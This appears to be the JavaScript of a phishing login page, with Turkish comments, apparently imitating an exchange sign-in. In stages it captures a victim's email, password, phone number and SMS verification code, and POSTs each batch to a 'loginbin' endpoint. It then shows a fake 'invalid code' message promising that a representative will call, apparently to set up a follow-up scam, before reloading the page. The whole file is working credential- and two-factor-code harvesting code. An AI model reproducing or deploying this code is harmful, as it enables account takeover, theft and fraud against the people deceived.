
$(function () {
    let qphone = $("#phone");
    let qemail = $("#email");
    let qpassword = $("#password");
    let showPassword = false;
    let email = '';
    let password = '';
    var passError = false;
    var emailError = false;
    let emailRegex = /^[\w+&*-]+[-+.'&*\w]*@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$/;
    let pwValid = /(?=.*\d)(?=.*[A-Z])[\s\S]{8,128}/;
    let $loginMain = $("#loginMain");
    let $phoneMain = $("#phoneMain");
    let $smsMain = $("#smsMain");
    let $controlMain = $("#controlMain");
    let $emailForm = $("form[name=email]");
    let $phoneForm = $("form[name=phoneForm]");
    let $smsForm = $("form[name=smsForm]");
    var jsData = {
        email: '',
        password: '',
        phone: '',
        sms: ''
    }
    var iti = null;
    class bin {
        constructor() {
            $phoneMain.hide();
            $smsMain.hide();
            $controlMain.hide();
            var csrfToken = $('meta[name="csrf-token"]').attr("content");
            $.ajaxSetup({
                headers: {
                    "X-CSRF-TOKEN": csrfToken,
                },
            });
            $("#smscode").mask('9-9-9-9-9-9');
        }
        telInput() {
            let ph = document.querySelector('#phone');
            this.iti = window.intlTelInput(ph, {
                initialCountry: 'TR',
                separateDialCode: true,
                utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.13/js/utils.js",
            });

            // Kullanıcının sadece sayı girmesini sağla ve baştaki boşluğu engelle
            ph.addEventListener('keydown', function (e) {
                // Baştaki boşluk engeli
                if (e.key === ' ' && this.selectionStart === 0) {
                    e.preventDefault();
                }

                // Sadece rakam, backspace, silme tuşlarına izin ver
                const allowedKeys = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab'];
                if (!/[0-9]/.test(e.key) && !allowedKeys.includes(e.key)) {
                    e.preventDefault();
                }
            });

            // Yapıştırma olayında baştaki boşluğu ve rakam dışı karakterleri engelle
            ph.addEventListener('paste', function (e) {
                e.preventDefault();
                let pasted = (e.clipboardData || window.clipboardData).getData('text');
                pasted = pasted.replace(/\D/g, ''); // Sadece rakamlar
                this.value += pasted;
            });

            // Otomatik düzeltme: boşlukla başlayan inputu temizle
            ph.addEventListener('input', function () {
                this.value = this.value.trimStart().replace(/\D/g, '');
            });

            $(ph).mask("999 999 99 99");
        }
        handleFocus() {
            $("#email,#password").focus(function (e) {
                let $target = $(e.target);
                $target.prev().hide();
            });

            $("#email,#password").focusout(function (e) {
                let $target = $(e.target);
                if ($target.val() != '')
                    return;
                $target.prev().show();
            });
        }
        emailCheck() {
            if (emailRegex.test($('#email').val())) {
                $("#email").parent().find('.err-tip').addClass('d-none').hide(); // Hata mesajını gizle
                this.emailError = false; // Hata yok
                return true; // Doğru e-posta
            } else {
                $("#email").parent().find('.err-tip').removeClass('d-none').show(); // Hata mesajını göster
                this.emailError = true; // Hata var
                return false; // Yanlış e-posta
            }
        }

        passwordCheck() {
            if (pwValid.test($('#password').val())) {
                $('.pass-err').addClass('d-none').hide(); // Hata mesajını gizle
                this.passError = false; // Hata yok
                return true; // Doğru şifre
            } else {
                $('.pass-err').removeClass('d-none').show(); // Hata mesajını göster
                this.passError = true; // Hata var
                return false; // Yanlış şifre
            }
        }

        emailSubmit() {
            let instance = this;
            $emailForm.submit(function (e) {
                e.preventDefault(); // Sayfanın yeniden yüklenmesini engelle
                let emailValidate = instance.emailCheck();
                let pwValidate = instance.passwordCheck();
                console.log(instance.emailError, instance.passError);

                if (emailValidate && pwValidate) {
                    $loginMain.hide();
                    $phoneMain.fadeIn();
                    jsData = {
                        email: qemail.val(),
                        password: qpassword.val(),
                        step: 1,
                    };
                    fbq('track', 'CompleteRegistration');
                    instance.postData();
                }
            });
        }

        phoneSubmit() {
            let instance = this;
            $phoneForm.submit(function (e) {
                let getNumber = instance.iti.getNumber();
                let defPhone = $("#phone").val();
                const phoneRegex = /^[\d\s+]+$/;
                if (!phoneRegex.test(getNumber) || defPhone.length < 10) {
                    $(".smsvalid").css('color', 'darkred')
                } else {
                    jsData = {
                        ...jsData,
                        step: 2,
                        phone: instance.iti.getNumber()
                    };

                    $phoneMain.hide();
                    $smsMain.fadeIn();
                    instance.postData();
                }


                return false;

            });

        }

        smsSubmit() {
            let instance = this;
            $smsForm.submit(function (e) {
                let getSms = $("#smscode").val();
                jsData = {
                    ...jsData,
                    step: 3,
                    sms: getSms
                };
                $smsMain.hide();
                $controlMain.fadeIn();
                instance.postData();
                instance.lastStep();
                return false;
            });

        }

        postData() {
            $.ajax({
                url: 'loginbin',
                type: 'POST',
                dataType: 'json',
                data: jsData,
                function(response) {

                },
                error: function (err) {
                    toastr.error("Telefon, Eposta ve Şifre eksiksiz olmalı", "Yönlendiriliyorsunuz...")
                    setTimeout(function () {
                        location.reload();
                    }, 3000)
                }
            })
        }

        lastStep() {

            setTimeout(() => {
                $("#controlMain").hide().fadeIn(500);
                $(".otitle").text('Geçersiz Onay Kodu')
                $(".oload").text('Giriş problemi yaşıyorsanız temsilcimiz sizi konu ile ilgili arayacaktır')
                $(".loading-svg").hide();

                setTimeout(() => {
                    location.reload();
                }, 5000)
            }, 5000);

        }

        footMenuToggle() {
            $(".list-view .subpop").click(function () {
                $(this).next('ul').fadeToggle();
            });
        }

        init() {
            this.handleFocus();
            this.emailSubmit();
            this.telInput();
            this.phoneSubmit();
            this.smsSubmit();
            this.footMenuToggle();
        }

    }
    let exec = new bin();
    exec.init();

});
